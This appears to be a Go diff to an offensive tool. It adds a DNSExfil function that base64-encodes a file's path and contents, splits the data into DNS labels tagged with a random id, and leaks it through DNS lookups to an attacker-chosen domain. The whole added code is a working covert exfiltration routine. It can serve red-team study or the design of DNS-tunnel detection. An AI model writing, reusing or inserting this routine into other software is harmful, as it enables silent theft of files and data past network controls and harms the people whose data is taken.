@@ -9,8 +9,10 @@ import (
 	"crypto/rsa"
 	"crypto/sha256"
 	"encoding/base64"
+	"encoding/hex"
 	"fmt"
 	"io"
+	"net"
 	"net/http"
 	"os"
 	"time"
@@ -94,6 +96,90 @@ func AESEncrypt(passwd string) EncryptFunc {
 // Base64Encode will "encrypt" using base64, obvs.
 func Base64Encode(path string, b []byte) ([]byte, error) {
 	return []byte(base64.StdEncoding.EncodeToString(b)), nil
+}
+
+// DNSExfil will return a function pointer to an ExfilFunc that
+// makes DNS queries to the specified domain.
+func DNSExfil(domain string) ExfilFunc {
+	return func(path string, b []byte) error {
+		var b64 string
+		var data []byte = append([]byte(path+" "), b...)
+		var done bool
+		var e error
+		var fqdn string
+		var label string
+		var leftover string
+		var max int = 253 - len(domain) - 1
+		var special = map[byte]string{
+			'+': ".plus",
+			'/': ".slash",
+			'=': ".equal",
+		}
+		var stream *bytes.Reader
+		var tmp byte
+		var uuid [24]byte
+
+		// Get UUID
+		if _, e = rand.Read(uuid[:]); e != nil {
+			return e
+		}
+
+		// Base64 encode data
+		b64 = base64.StdEncoding.EncodeToString(data)
+		stream = bytes.NewReader([]byte(b64))
+
+		// Stream data via DNS queries
+		for !done || (leftover != "") {
+			// Account for leftover from last loop
+			fqdn = hex.EncodeToString(uuid[:]) + leftover
+			leftover = ""
+
+			// Create fqdn
+			for !done {
+				// Create label
+				label = ""
+				for !done {
+					// Read 1 byte at a time
+					if tmp, e = stream.ReadByte(); e == io.EOF {
+						done = true
+						break
+					} else if e != nil {
+						return e
+					}
+
+					// Check for special chars
+					if _, ok := special[tmp]; ok {
+						if len(fqdn+"."+label+special[tmp]) > max {
+							leftover = special[tmp]
+						} else {
+							label += special[tmp]
+						}
+
+						break
+					} else {
+						label += string(tmp)
+					}
+
+					// Check label length
+					if len(label) >= 63 {
+						break
+					}
+				}
+
+				// Check fqdn length
+				if len(fqdn+"."+label) > max {
+					leftover = "." + label
+					break
+				} else {
+					fqdn += "." + label
+				}
+			}
+
+			net.LookupIP(fqdn)
+		}
+
+		return nil
+	}
 }
 
 // HTTPExfil will return a function pointer to an ExfilFunc that
